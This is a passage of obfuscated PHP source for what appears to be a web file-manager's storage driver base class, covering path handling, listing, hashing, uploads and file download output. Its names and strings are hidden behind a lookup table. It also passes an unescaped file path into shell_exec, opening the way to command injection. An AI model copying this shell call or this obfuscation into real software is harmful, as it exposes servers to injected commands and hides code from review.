$Õ¸Åë¶Œ) { $ÕÊÕÓğ[$¯À –òÛ] = current($Õ¸Åë¶Œ); } return $ÕÊÕÓğ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $şŸ¢‚‘ =& $_SERVER[ŒÅŸ‹ä†]; $this->error = $this->_linkID->lastErrorMsg(); if ($şŸ¢‚‘[12] != $this->queryStr) { $this->error .= LNG($şŸ¢‚‘[58]) . $this->queryStr; } think_trace($this->error, $şŸ¢‚‘[12], $şŸ¢‚‘[59]); return $this->error; } public function escapeString($ŒÜ™û§Å) { $·çÒ’æ¹ =& $_SERVER[ŒÅŸ‹ä†]; if ($this->_linkID) { return $this->_linkID->escapeString($ŒÜ™û§Å); } return str_ireplace($·çÒ’æ¹[68], $·çÒ’æ¹[69], $ŒÜ™û§Å); } public function parseLimit($¥²’úŸ²) { $Í¦¸Ä ‹ =& $_SERVER[ŒÅŸ‹ä†]; $ÂïòøŞ = $Í¦¸Ä ‹[12]; if (!empty($¥²’úŸ²)) { $¥²’úŸ² = explode($Í¦¸Ä ‹[60], $¥²’úŸ²); if (count($¥²’úŸ²) > 1) { $ÂïòøŞ .= $Í¦¸Ä ‹[61] . $¥²’úŸ²[1] . $Í¦¸Ä ‹[62] . $¥²’úŸ²[0] . $Í¦¸Ä ‹[63]; } else { $ÂïòøŞ .= $Í¦¸Ä ‹[61] . $¥²’úŸ²[0] . $Í¦¸Ä ‹[63]; } } return $ÂïòøŞ; } } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $¤ãÜ¿£î =& $_SERVER[ŒÅŸ‹ä†]; $this->objectDriver = array($¤ãÜ¿£î[70], $¤ãÜ¿£î[71], $¤ãÜ¿£î[72], $¤ãÜ¿£î[73], $¤ãÜ¿£î[74], $¤ãÜ¿£î[75], $¤ãÜ¿£î[76], $¤ãÜ¿£î[77], $¤ãÜ¿£î[78], $¤ãÜ¿£î[79], $¤ãÜ¿£î[80], $¤ãÜ¿£î[81]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($üœÕÜˆß) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($üœÕÜˆß, $_SERVER[ŒÅŸ‹ä†][8]); } return $üœÕÜˆß; } public function iconvApp($îİ©œò­) { return $îİ©œò­; } public function iconvSystem($öü©’¯ô) { return $öü©’¯ô; } public function iconvTo($˜·äíöä, $¬øì³å, $†ƒˆ§ò©) { $Èˆ’òì” =& $_SERVER[ŒÅŸ‹ä†]; if (!$˜·äíöä || !function_exists($Èˆ’òì”[82])) { return $˜·äíöä; } static $Ë¯ô‘ËÏ = array(); $£»­…·‚ = $¬øì³å . $Èˆ’òì”[83] . $†ƒˆ§ò© . $Èˆ’òì”[84] . $˜·äíöä; if (isset($Ë¯ô‘ËÏ[$£»­…·‚])) { return $Ë¯ô‘ËÏ[$£»­…·‚]; } if (function_exists($Èˆ’òì”[85])) { $óÇÌÊÈª = @mb_convert_encoding($˜·äíöä, $†ƒˆ§ò©, $¬øì³å); } else { $óÇÌÊÈª = @iconv($¬øì³å, $†ƒˆ§ò©, $˜·äíöä); } $óÇÌÊÈª = $óÇÌÊÈª ? $óÇÌÊÈª : $˜·äíöä; if (strstr($óÇÌÊÈª, $Èˆ’òì”[86])) { $óÇÌÊÈª = str_replace($Èˆ’òì”[86], $Èˆ’òì”[11], $óÇÌÊÈª); } $Ë¯ô‘ËÏ[$¬øì³å . $Èˆ’òì”[83] . $†ƒˆ§ò© . $Èˆ’òì”[84] . $˜·äíöä] = $óÇÌÊÈª; $Ë¯ô‘ËÏ[$†ƒˆ§ò© . $Èˆ’òì”[83] . $¬øì³å . $Èˆ’òì”[84] . $˜·äíöä] = $˜·äíöä; $Ë¯ô‘ËÏ[$†ƒˆ§ò© . $Èˆ’òì”[83] . $¬øì³å . $Èˆ’òì”[84] . $óÇÌÊÈª] = $˜·äíöä; $Ë¯ô‘ËÏ[$¬øì³å . $Èˆ’òì”[83] . $†ƒˆ§ò© . $Èˆ’òì”[84] . $óÇÌÊÈª] = $óÇÌÊÈª; return $óÇÌÊÈª; } public function getPathInner($üŠËñ) { $…œÃÕÉ½ = IO::init($üŠËñ); return $…œÃÕÉ½->path; } public function getPathOuter($²Ø·†ã ) { $¬£¶ùÈ =& $_SERVER[ŒÅŸ‹ä†]; $ÅÜ²†Ğ = strlen(trim($this->pathBase, $¬£¶ùÈ[8])); $²Ø·†ã  = substr(trim($²Ø·†ã , $¬£¶ùÈ[8]), $ÅÜ²†Ğ); return $this->pathDriver . $¬£¶ùÈ[8] . ltrim($²Ø·†ã , $¬£¶ùÈ[8]); } public function isParentOf($¬¿ºÁëÕ, $šú¢¨ğÇ) { $ÄãÄĞò =& $_SERVER[ŒÅŸ‹ä†]; $¬¿ºÁëÕ = rtrim(strtolower($¬¿ºÁëÕ), $ÄãÄĞò[8]) . $ÄãÄĞò[8]; $šú¢¨ğÇ = rtrim(strtolower($šú¢¨ğÇ), $ÄãÄĞò[8]) . $ÄãÄĞò[8]; $ãš´Ù—Ò = strpos($šú¢¨ğÇ, $¬¿ºÁëÕ) === 0; return $ãš´Ù—Ò; } public function getType() { $Ó¥¨İ =& $_SERVER[ŒÅŸ‹ä†]; $ÓÎ·í = str_replace($Ó¥¨İ[87], $Ó¥¨İ[12], get_class($this)); return strtolower($ÓÎ·í); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($“Æò–Ìé, $¬œÜ®ñò) { $™šÀ³âÄ =& $_SERVER[ŒÅŸ‹ä†]; $£‚ÚÃ‰³ = rtrim($“Æò–Ìé, $™šÀ³âÄ[8]) . $™šÀ³âÄ[8] . $¬œÜ®ñò; $½½êÄÆÖ = $this->exist($£‚ÚÃ‰³); return $½½êÄÆÖ ? $£‚ÚÃ‰³ : !1; } public function setModifyTime($å­Áè¿, $¿¸º¨¨” = '') { } public function renameObject($„ê§Äí, $¼½½øÍï) { $ŒõÊÚöö = $¼½½øÍï; $„ê§Äí = $this->getPathOuter($„ê§Äí); $¼½½øÍï = $this->pathFather($„ê§Äí) . $¼½½øÍï; $–ÙÉ×Û = IO::copy($„ê§Äí, $this->pathFather($„ê§Äí), REPEAT_RENAME_FOLDER, $ŒõÊÚöö); if ($–ÙÉ×Û) { IO::remove($„ê§Äí); } return $–ÙÉ×Û ? $¼½½øÍï : !1; } public function tempFile($€¤é×ëò = '', $“¶Æ´ş = '') { if (!$€¤é×ëò) { $€¤é×ëò = rand_string(15); } $Ê¥ú¦º¯ = TEMP_FILES . rand_string(15) . $_SERVER[ŒÅŸ‹ä†][8]; @mkdir($Ê¥ú¦º¯, DEFAULT_PERRMISSIONS, !0); $¤”¦ƒî = $Ê¥ú¦º¯ . $€¤é×ëò; @touch($¤”¦ƒî); if ($“¶Æ´ş) { file_put_contents($¤”¦ƒî, $“¶Æ´ş); } return $¤”¦ƒî; } public function tempFileRemve($¹éàØÍ†) { @unlink($¹éàØÍ†); @rmdir($this->pathFather($¹éàØÍ†)); } public function mkfile($ÙŠµı¡, $À¼ô»ƒ‘ = '', $âë²áÃ = REPEAT_RENAME) { } public function mkdir($’—øÃ Ø, $ÎÚ¿Ğ›Ï = REPEAT_SKIP) { } public function delFile($’ºúÃ…Â) { } public function delFolder($Ëò›‡¤¤) { } public function copyFile($¨»”ÓÑŠ, $ÈÒíšÇ) { } public function moveFile($úŞ”†Ğï, $şâõ»‰º) { } public function remove($¾¥åõÄç) { if ($this->isFile($¾¥åõÄç)) { return $this->delFile($¾¥åõÄç); } return $this->delFolder($¾¥åõÄç); } public function rename($¹œôæ–, $©ºÅÕ³) { } public function exist($¯ß¨Ğíà) { } public function isFile($”ÔççıÍ) { } public function isFolder($©ú®¾Ë) { } public function size($ŞÔ¾‚€Ç) { } public function info($Ğûèê) { } public function infoSimple($˜¼±øä÷) { return $this->info($˜¼±øä÷); } public function infoAuth($ğâ„óš) { return $this->info($ğâ„óš); } public function infoFull($µæÔûèÂ) { return $this->info($µæÔûèÂ); } public function infoFullSimple($¬Õó†¥¤) { return $this->info($¬Õó†¥¤); } public function infoWithChildren($Õ£§û‡å) { $äˆïü˜ =& $_SERVER[ŒÅŸ‹ä†]; static $²ÆÓÁ¤Ç = array(); if (isset($²ÆÓÁ¤Ç[$Õ£§û‡å])) { return $²ÆÓÁ¤Ç[$Õ£§û‡å]; } $Ÿ×’à¨ = $this->info($Õ£§û‡å); if ($Ÿ×’à¨ && $Ÿ×’à¨[$äˆïü˜[43]] == $äˆïü˜[88]) { $÷¬¨¤óÁ = array($äˆïü˜[89] => 0, $äˆïü˜[90] => 0, $äˆïü˜[91] => 0); $this->infoChildren($Õ£§û‡å, $÷¬¨¤óÁ); $Ÿ×’à¨[$äˆïü˜[89]] = $÷¬¨¤óÁ[$äˆïü˜[89]]; $Ÿ×’à¨[$äˆïü˜[92]] = array($äˆïü˜[93] => $÷¬¨¤óÁ[$äˆïü˜[90]], $äˆïü˜[94] => $÷¬¨¤óÁ[$äˆïü˜[91]]); $²ÆÓÁ¤Ç[$Õ£§û‡å] = $Ÿ×’à¨; } return $Ÿ×’à¨; } public function listPath($í˜•‰ŒÏ, $ĞÒï£Ì = false) { } public function has($§Ç¢¶Æ˜, $ÙÍ¥™Ú¤ = false, $õ§íü‹ó = false) { } public function canRead($çª è÷) { } public function canWrite($¶ÒŸîöß) { } public function getContent($¼âôÕò) { } public function setContent($©İÆà¶¯, $ÈÁ‘¡àˆ = '') { } protected function infoChildren($¶éÙÙ‘, &$ØÃŞõ±Ó) { $¸„‡îê› =& $_SERVER[ŒÅŸ‹ä†]; check_abort_echo(); $ĞÍîõã¼ = $this->listPath($¶éÙÙ‘, !0); $ĞÍîõã¼ = array_merge($ĞÍîõã¼[$¸„‡îê›[95]], $ĞÍîõã¼[$¸„‡îê›[96]]); foreach ($ĞÍîõã¼ as $¤ëÌ´¤õ) { if ($¤ëÌ´¤õ[$¸„‡îê›[43]] == $¸„‡îê›[88]) { $ØÃŞõ±Ó[$¸„‡îê›[91]]++; $‰ô¨µ€ø = $this->getPathInner($¤ëÌ´¤õ[$¸„‡îê›[97]]); $this->infoChildren($‰ô¨µ€ø, $ØÃŞõ±Ó); } else { $ØÃŞõ±Ó[$¸„‡îê›[90]]++; $ØÃŞõ±Ó[$¸„‡îê›[89]] += $¤ëÌ´¤õ[$¸„‡îê›[89]]; } } } public function fileSubstr($µïäÃú, $—­”‡ç§, $ş©¼²ı„) { } public function listAll($³õŠÔ½ñ) { } public function listAllMake($‰”¬€Ş‹, &$Ş¸’Ëóí) { $ëıÊ¬š„ =& $_SERVER[ŒÅŸ‹ä†]; check_abort_echo(); $ğààÙÅË = $this->listPath($‰”¬€Ş‹, !0); if (!$ğààÙÅË) { return; } $ÖÁ‚øØ® = array_merge($ğààÙÅË[$ëıÊ¬š„[95]], $ğààÙÅË[$ëıÊ¬š„[96]]); foreach ($ÖÁ‚øØ® as $Øˆ‘ç) { $Í¡¢¸´Ê = $Øˆ‘ç[$ëıÊ¬š„[43]] == $ëıÊ¬š„[88]; $î·Ó°«à = array($ëıÊ¬š„[97] => $Øˆ‘ç[$ëıÊ¬š„[97]], $ëıÊ¬š„[88] => $Í¡¢¸´Ê); if (isset($Øˆ‘ç[$ëıÊ¬š„[89]])) { $î·Ó°«à[$ëıÊ¬š„[89]] = $Øˆ‘ç[$ëıÊ¬š„[89]]; } if (isset($Øˆ‘ç[$ëıÊ¬š„[98]])) { $î·Ó°«à[$ëıÊ¬š„[98]] = $Øˆ‘ç[$ëıÊ¬š„[98]]; } if (!$Í¡¢¸´Ê) { $Ş¸’Ëóí[] = $î·Ó°«à; continue; } $Ş¸’Ëóí[] = $î·Ó°«à; $ºùâéİ = $Øˆ‘ç[$ëıÊ¬š„[97]]; $½àõÏô“ = $this->pathDriver; if (substr($Øˆ‘ç[$ëıÊ¬š„[97]], 0, strlen($½àõÏô“)) == $½àõÏô“) { $ºùâéİ = substr($ºùâéİ, strlen($½àõÏô“)); } $this->listAllMake($ºùâéİ, $Ş¸’Ëóí); } } public function listAllSimple($‰ù¨¹­Ñ, $Í•Ú¥èâ = false) { $µ˜Ñ‘ò‘ = $this->listAll($‰ù¨¹­Ñ); return $this->listAllSimpleMake($µ˜Ñ‘ò‘, $this->getPathOuter($‰ù¨¹­Ñ), $Í•Ú¥èâ); } public function listAllSimpleMake($üÙº¤¹, $Ş¾Ûñï¡, $×ª¸Âå) { $ú®÷ùè¶ =& $_SERVER[ŒÅŸ‹ä†]; $ˆ“¢öú£ = array(); $Ş¾Ûñï¡ = rtrim(get_path_father($Ş¾Ûñï¡), $ú®÷ùè¶[8]) . $ú®÷ùè¶[8]; foreach ($üÙº¤¹ as $ºÄ¤™î) { $­šì‘©Ú = array($ú®÷ùè¶[97] => $ºÄ¤™î[$ú®÷ùè¶[97]], $ú®÷ùè¶[99] => $ºÄ¤™î[$ú®÷ùè¶[97]], $ú®÷ùè¶[88] => $ºÄ¤™î[$ú®÷ùè¶[88]]); if (isset($ºÄ¤™î[$ú®÷ùè¶[89]]) && !$ºÄ¤™î[$ú®÷ùè¶[88]]) { $­šì‘©Ú[$ú®÷ùè¶[89]] = $ºÄ¤™î[$ú®÷ùè¶[89]]; } if (isset($ºÄ¤™î[$ú®÷ùè¶[98]])) { $­šì‘©Ú[$ú®÷ùè¶[98]] = $ºÄ¤™î[$ú®÷ùè¶[98]]; } if (is_array($ºÄ¤™î[$ú®÷ùè¶[100]])) { $­šì‘©Ú[$ú®÷ùè¶[99]] = $ºÄ¤™î[$ú®÷ùè¶[100]][$ú®÷ùè¶[97]]; $­šì‘©Ú[$ú®÷ùè¶[89]] = $ºÄ¤™î[$ú®÷ùè¶[100]][$ú®÷ùè¶[89]]; $­šì‘©Ú[$ú®÷ùè¶[98]] = $ºÄ¤™î[$ú®÷ùè¶[100]][$ú®÷ùè¶[98]]; } else { if (substr($ºÄ¤™î[$ú®÷ùè¶[97]], 0, strlen($Ş¾Ûñï¡)) == $Ş¾Ûñï¡) { $­šì‘©Ú[$ú®÷ùè¶[97]] = substr($ºÄ¤™î[$ú®÷ùè¶[97]], strlen($Ş¾Ûñï¡)); } } $„¬­îíŸ = $ºÄ¤™î[$ú®÷ùè¶[88]] ? $ú®÷ùè¶[8] : $ú®÷ùè¶[12]; $­šì‘©Ú[$ú®÷ùè¶[99]] = rtrim($­šì‘©Ú[$ú®÷ùè¶[99]], $ú®÷ùè¶[8]) . $„¬­îíŸ; $­šì‘©Ú[$ú®÷ùè¶[97]] = $ú®÷ùè¶[8] . trim($­šì‘©Ú[$ú®÷ùè¶[97]], $ú®÷ùè¶[8]) . $„¬­îíŸ; if (!$×ª¸Âå) { $Ô’ ğÅ¶ = explode($ú®÷ùè¶[8], trim($­šì‘©Ú[$ú®÷ùè¶[97]], $ú®÷ùè¶[8])); $­šì‘©Ú[$ú®÷ùè¶[97]] = $ú®÷ùè¶[8] . implode($ú®÷ùè¶[8], array_slice($Ô’ ğÅ¶, 1)) . $„¬­îíŸ; } $ˆ“¢öú£[] = $­šì‘©Ú; } return array_sort_by($ˆ“¢öú£, $ú®÷ùè¶[97]); } public function upload($µôÑ““ƒ, $İÚ”Šı, $¹Ÿú• = false, $øãÕ¾‰ = REPEAT_REPLACE) { } public function uploadFileByID($¸ÍğÎÅ, $Ÿ–¼ÕÖì, $Ûƒçù£š) { } public function uploadFileByPath($êÛÛ‚ÃÎ, $½ğŒæÄÑ, $”•«”¶§ = array()) { } public function isUploadServer() { $ê´Õšèù =& $_SERVER[ŒÅŸ‹ä†]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ê´Õšèù[101]) { return !0; } return $GLOBALS[$ê´Õšèù[6]][$ê´Õšèù[102]][$ê´Õšèù[103]]; } public function isFileOutServer() { $âØµóÀ» =& $_SERVER[ŒÅŸ‹ä†]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $âØµóÀ»[101]) { return !0; } return $GLOBALS[$âØµóÀ»[6]][$âØµóÀ»[102]][$âØµóÀ»[104]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($ÃÉòÌ†¿) { $‘íÇã =& $_SERVER[ŒÅŸ‹ä†]; if (!$this->isCdnHost()) { return $ÃÉòÌ†¿; } return str_replace(trim(get_url_root($ÃÉòÌ†¿), $‘íÇã[8]), trim($this->cdnHost, $‘íÇã[8]), $ÃÉòÌ†¿); } public function uploadLink($ğ­¡¦À, $“ˆê—Ö» = 0) { $½İÖ³òÎ =& $_SERVER[ŒÅŸ‹ä†]; if ($this->isUploadServer()) { return; } $¼”×”—© = $this->getType(); if (!in_array($¼”×”—©, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ø¢ğùçÚ = 1024 * 1024 * 10; $…’Æ›û‚ = (!$“ˆê—Ö» ? 1 : ceil($“ˆê—Ö» / pow(1024, 3))) * 3600 * 4; if ($“ˆê—Ö» <= $ø¢ğùçÚ) { $¿‚çâñƒ = $this->uploadFormData($ğ­¡¦À, $…’Æ›û‚); } else { $¿‚çâñƒ = $this->uploadMultiData($ğ­¡¦À, $…’Æ›û‚); } if ($¿‚çâñƒ) { $¿‚çâñƒ[$½İÖ³òÎ[105]] = $ğ­¡¦À; $¿‚çâñƒ[$½İÖ³òÎ[106]] = $¼”×”—©; } return $¿‚çâñƒ; } public function uploadFormData($¸½¤€âÙ, $ëÄúà®× = 3600) { } public function uploadMultiData($Úƒ‹¥ª‚, $é©ş‰ç¦ = 3600) { } public function multiUploadFormData($‹¨ş¬¶Ş, $§ÜÒûº = 3600) { return $this->uploadMultiData($‹¨ş¬¶Ş, $§ÜÒûº); } public function download($„ĞëâÀç, $ÂÃâ‚‘Ş) { } public function ext($Í¾•ÊË¡) { $öå¤ÕÓî =& $_SERVER[ŒÅŸ‹ä†]; if (strpos($Í¾•ÊË¡, $öå¤ÕÓî[8]) === -1) { $œ½×£û = $Í¾•ÊË¡; } else { $œ½×£û = $this->pathThis($Í¾•ÊË¡); } $«è¨Àœ¡ = $öå¤ÕÓî[12]; if (strstr($œ½×£û, $öå¤ÕÓî[10])) { $«è¨Àœ¡ = substr($œ½×£û, strrpos($œ½×£û, $öå¤ÕÓî[10]) + 1); $«è¨Àœ¡ = strtolower($«è¨Àœ¡); } if (strlen($«è¨Àœ¡) > 3 && preg_match($öå¤ÕÓî[107], $«è¨Àœ¡, $ÎÓàœ€¶)) { $«è¨Àœ¡ = $öå¤ÕÓî[12]; } return $«è¨Àœ¡; } public function pathThis($»‚ÕÓŠÅ) { $ ù¿¬×‹ =& $_SERVER[ŒÅŸ‹ä†]; $»‚ÕÓŠÅ = str_replace($ ù¿¬×‹[108], $ ù¿¬×‹[8], rtrim($»‚ÕÓŠÅ, $ ù¿¬×‹[8])); $–ê‘Õ§” = strrpos($»‚ÕÓŠÅ, $ ù¿¬×‹[8]); if ($–ê‘Õ§” === !1) { return $»‚ÕÓŠÅ; } return substr($»‚ÕÓŠÅ, $–ê‘Õ§” + 1); } public function pathFather($éÛÇ™Áı) { $Ä®ÀÄ¶ô =& $_SERVER[ŒÅŸ‹ä†]; $éÛÇ™Áı = str_replace($Ä®ÀÄ¶ô[108], $Ä®ÀÄ¶ô[8], rtrim($éÛÇ™Áı, $Ä®ÀÄ¶ô[8])); $¼ö«¿€’ = strrpos($éÛÇ™Áı, $Ä®ÀÄ¶ô[8]); if ($¼ö«¿€’ === !1) { return $Ä®ÀÄ¶ô[12]; } return substr($éÛÇ™Áı, 0, $¼ö«¿€’ + 1); } public function hashSimple($€–‰×ò°) { $óïß½ªÀ =& $_SERVER[ŒÅŸ‹ä†]; if (!$€–‰×ò°) { return md5($óïß½ªÀ[12]); } $âèÇ©¼ = $this->size($€–‰×ò°); $¡÷±¢‹ş = 200; $²íŒŠË× = 50; if ($âèÇ©¼ <= $¡÷±¢‹ş * $²íŒŠË×) { return $this->hashMd5($€–‰×ò°) . $âèÇ©¼; } $Çöİ‡Ô• = intval($âèÇ©¼ / $²íŒŠË×); $¸ê‹ó· = $óïß½ªÀ[12]; for ($ñ×Øƒù› = 0; $ñ×Øƒù› < $²íŒŠË×; $ñ×Øƒù›++) { $¸ê‹ó· .= $this->fileSubstr($€–‰×ò°, $Çöİ‡Ô• * $ñ×Øƒù›, $¡÷±¢‹ş); } $¸ê‹ó· .= $this->fileSubstr($€–‰×ò°, $âèÇ©¼ - $¡÷±¢‹ş, $¡÷±¢‹ş); return md5($¸ê‹ó·) . $âèÇ©¼; } public static $md5Cache = array(); public function hashMd5($ëŸç±¡Å) { if (!$ëŸç±¡Å) { return md5($_SERVER[ŒÅŸ‹ä†][12]); } $ëŸç±¡Å = $this->iconvSystem($ëŸç±¡Å); if (isset(self::$md5Cache[$ëŸç±¡Å])) { return self::$md5Cache[$ëŸç±¡Å]; } self::$md5Cache[$ëŸç±¡Å] = $this->hashMd5Shell($ëŸç±¡Å); if (!self::$md5Cache[$ëŸç±¡Å]) { self::$md5Cache[$ëŸç±¡Å] = @md5_file($ëŸç±¡Å); } return self::$md5Cache[$ëŸç±¡Å]; } private function hashMd5Shell($ìúÄ¤) { $Ãô¬Ù€ =& $_SERVER[ŒÅŸ‹ä†]; if (!$ìúÄ¤) { return md5($Ãô¬Ù€[12]); } if (!function_exists($Ãô¬Ù€[109])) { return !1; } $ó£İ ® = array($Ãô¬Ù€[110], $Ãô¬Ù€[111]); $«Æ²Ëå = Cache::get($Ãô¬Ù€[112]); if (!$«Æ²Ëå) { $ù¨°—ê† = BASIC_PATH . $Ãô¬Ù€[113]; $—”…µó» = md5_file($ù¨°—ê†); $«Æ²Ëå = $Ãô¬Ù€[114]; foreach ($ó£İ ® as $£â„óîó) { $š¨¿üñ = shell_exec($£â„óîó . "\x20\42{$ù¨°—ê†}\42"); if ($š¨¿üñ && substr(trim($š¨¿üñ), 0, 32) == $—”…µó») { $«Æ²Ëå = $£â„óîó; break; } } Cache::set($Ãô¬Ù€[112], $«Æ²Ëå, 3600); } if ($«Æ²Ëå == $Ãô¬Ù€[114]) { return !1; } $š¨¿üñ = shell_exec($«Æ²Ëå . "\40\x22{$ìúÄ¤}\42"); $š¨¿üñ = str_replace($Ãô¬Ù€[115], $Ãô¬Ù€[12], $š¨¿üñ); return substr($š¨¿üñ, 0, 32); } public function link($Ö¸Ò¯ÒŠ) { return $Ö¸Ò¯ÒŠ; } public function fileOut($Š„á±‰‰, $œÌüåˆ£ = false, $Ó’·¡º = false, $‡¬ÑÜ‹Ñ = '') { $æ§İ¿ =& $_SERVER[ŒÅŸ‹ä†]; $this->cacheMethod(null, null); if (!$Š„á±‰‰ || !$this->exist($Š„á±‰‰)) { show_json(LNG($æ§İ¿[116]), !1, $Ó’·¡º); } $è‘£…Ô† = $this->getType() == $æ§İ¿[117]; $’·íÊ = $GLOBALS[$æ§İ¿[6]][$æ§İ¿[102]][$æ§İ¿[118]][$æ§İ¿[119]]; $š¡ ¼® = (double) $GLOBALS[$æ§İ¿[6]][$æ§İ¿[102]][$æ§İ¿[118]][$æ§İ¿[120]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $¶™Š¥›Ş = $this->infoFull($Š„á±‰‰); $úÏ«§¾‰ = $¶™Š¥›Ş[$æ§İ¿[89]]; $˜ë½Òà¤ = gmdate($æ§İ¿[121], $¶™Š¥›Ş[$æ§İ¿[98]]); $®ú‘»®Ä = $Ó’·¡º ? $Ó’·¡º : $this->iconvApp($¶™Š¥›Ş[$æ§İ¿[42]]); $¨Ô¤£éí = 0; $±û«‚ŸÈ = $úÏ«§¾‰ - 1; $øÏ‰‚ÌÒ = $this->ext($®ú‘»®Ä); if (in_array($øÏ‰‚ÌÒ, array($æ§İ¿[122], $æ§İ¿[123], $æ§İ¿[124], $æ§İ¿[125]))) { $øÏ‰‚ÌÒ = $æ§İ¿[126]; } if (in_array($øÏ‰‚ÌÒ, array($æ§İ¿[127]))) { $øÏ‰‚ÌÒ = $æ§İ¿[128]; } if (!$‡¬ÑÜ‹Ñ) { $‡¬ÑÜ‹Ñ = md5($˜ë½Òà¤ . $úÏ«§¾‰); } $‡¬ÑÜ‹Ñ = $æ§İ¿[129] . $‡¬ÑÜ‹Ñ . $æ§İ¿[129]; $Óä¦”Á = get_file_mime($øÏ‰‚ÌÒ); $ÓàòÜ‹Ø = !0; $ÓàòÜ‹Ø = isset($_GET[$æ§İ¿[130]]) ? !1 : !0; if ($œÌüåˆ£ === !1 && !mime_support($Óä¦”Á)) { $Óä¦”Á = $æ§İ¿[131]; } header($æ§İ¿[132]); header($æ§İ¿[133] . $Óä¦”Á); $ÊğãÂ½õ = rawurlencode($®ú‘»®Ä); $ÊğãÂ½õ = $æ§İ¿[129] . $ÊğãÂ½õ . $æ§İ¿[134] . $ÊğãÂ½õ; if ($œÌüåˆ£) { header($æ§İ¿[135]); header($æ§İ¿[136] . $ÊğãÂ½õ); } else { if ($ÓàòÜ‹Ø) { header($æ§İ¿[137] . $ÊğãÂ½õ); } } $Â‹Ã€›å = 3600 * 24 * 30; header($æ§İ¿[138]); header($æ§İ¿[139]); header($æ§İ¿[140] . $Â‹Ã€›å); header($æ§İ¿[141] . gmdate($æ§İ¿[121], time() + $Â‹Ã€›å) . $æ§İ¿[142]); if (isset($_SERVER[$æ§İ¿[143]]) && strtotime($_SERVER[$æ§İ¿[143]]) == $¶™Š¥›Ş[$æ§İ¿[98]]) { header($æ§İ¿[144], !0, 304); die; } if (isset($_SERVER[$æ§İ¿[145]]) && $_SERVER[$æ§İ¿[145]] == $‡¬ÑÜ‹Ñ) { header($æ§İ¿[146] . $‡¬ÑÜ‹Ñ, !0, 304); die; } header($æ§İ¿[146] . $‡¬ÑÜ‹Ñ); header($æ§İ¿[147] . $˜ë½Òà¤ . $æ§İ¿[142]); header($æ§İ¿[148] . rawurlencode($®ú‘»®Ä)); header($æ§İ¿[149]); header($æ§İ¿[150] . $úÏ«§¾‰); header($æ§İ¿[151]); Hook::trigger($æ§İ¿[152], $Š„á±‰‰, $úÏ«§¾‰, $®ú‘»®Ä, $øÏ‰‚ÌÒ); if (!$œÌüåˆ£ && $øÏ‰‚ÌÒ == $æ§İ¿[153]) { if ($úÏ«§¾‰ > 1024 * 1024 * 10) { die; } $˜…³‡‹â = $this->getContent($Š„á±‰‰); $˜…³‡‹â = Html::clearSVG($˜…³‡‹â); header($æ§İ¿[154] . strlen($˜…³‡‹â)); echo $˜…³‡‹â; die; } $¸éø©Õ = strtolower($_SERVER[$æ§İ¿[155]]); if ($è‘£…Ô† && $¸éø©Õ && $’·íÊ) { if (strstr($¸éø©Õ, $æ§İ¿[156])) { header($æ§İ¿[157] . $Š„á±‰‰); } else { if (strstr($¸éø©Õ, $æ§İ¿[158])) { header($æ§İ¿[159] . $Š„á±‰‰); } else { if (strstr($¸éø©Õ, $æ§İ¿[160])) { header($æ§İ¿[161] . $Š„á±‰‰); } } } if ($š¡ ¼®) { header($æ§İ¿[162] . $š¡ ¼®); } return; } if (isset($_SERVER[$æ§İ¿[163]])) { if (preg_match($æ§İ¿[164], $_SERVER[$æ§İ¿[163]], $¤’‰œĞÈ)) { $¨Ô¤£éí = intval($¤’‰œĞÈ[1]); $¨Ô¤£éí = $¨Ô¤£éí <= 0 ? 0 : ($¨Ô¤£éí >= $±û«‚ŸÈ ? $±û«‚ŸÈ : $¨Ô¤£éí); if (!empty($¤’‰œĞÈ[2])) { $ËÛÚåİÕ = intval($¤’‰œĞÈ[2]); $±û«‚ŸÈ = $ËÛÚåİÕ < $¨Ô¤£éí ? $¨Ô¤£éí : ($ËÛÚåİÕ >= $±û«‚ŸÈ ? $±û«‚ŸÈ : $ËÛÚåİÕ); } } header($æ§İ¿[165]); header("\103\x6f\x6e\x74\x65\x6e\x74\x2d\x52\x61\x6e\147\x65\x3a\40\x62\x79\164\x65\163\x20{$¨Ô¤£éí}\55{$±û«‚ŸÈ}\x2f" . $úÏ«§¾‰); } else { header($æ§İ¿[166]); } header($æ§İ¿[167]); header($æ§İ¿[168]); $£ÊÙÅ´¢ = !0; if ($_SERVER[$æ§İ¿[169]] == $æ§İ¿[170] && $úÏ«§¾‰ > 1204 * 1024 * 1024 * 2) { $£ÊÙÅ´¢ = !1; } if ($£ÊÙÅ´¢) { header($æ§İ¿[171] . ($±û«‚ŸÈ - $¨Ô¤£éí + 1)); } if ($_SERVER[$æ§İ¿[172]] == $æ§İ¿[173]) { return; } $ÛËíÕûù = array($æ§İ¿[174] => !1, $æ§İ¿[175] => $¨Ô¤£éí, $æ§İ¿[176] => $±û«‚ŸÈ, $æ§İ¿[177] => $øÏ‰‚ÌÒ, $æ§İ¿[178] => $¶™Š¥›Ş, $æ§İ¿[179] => $æ§İ¿[12], $æ§İ¿[180] => 0); $ÛËíÕûù = Hook::filter($æ§İ¿[181], $ÛËíÕûù); $¿¤æ¹ãı = 1024 * 300; $Æ³èâı‹ = 0; if ($š¡ ¼®) { $Æ³èâı‹ = intval(1000 * 1000 * ($¿¤æ¹ãı / $š¡ ¼®)); } while ($¨Ô¤£éí <= $±û«‚ŸÈ) { $ ÚŠÌ­ = timeFloat(); check_abort(); $•ü—Öª = $±û«‚ŸÈ - $¨Ô¤£éí + 1; if ($•ü—Öª <= $¿¤æ¹ãı) { $¿¤æ¹ãı = $•ü—Öª; } $˜…³‡‹â = $this->fileSubstr($Š„á±‰‰, $¨Ô¤£éí, $¿¤æ¹ãı); if ($ÛËíÕûù[$æ§İ¿[174]]) { $ÛËíÕûù[$æ§İ¿[179]] = $˜…³‡‹â; $ÛËíÕûù[$æ§İ¿[180]] = 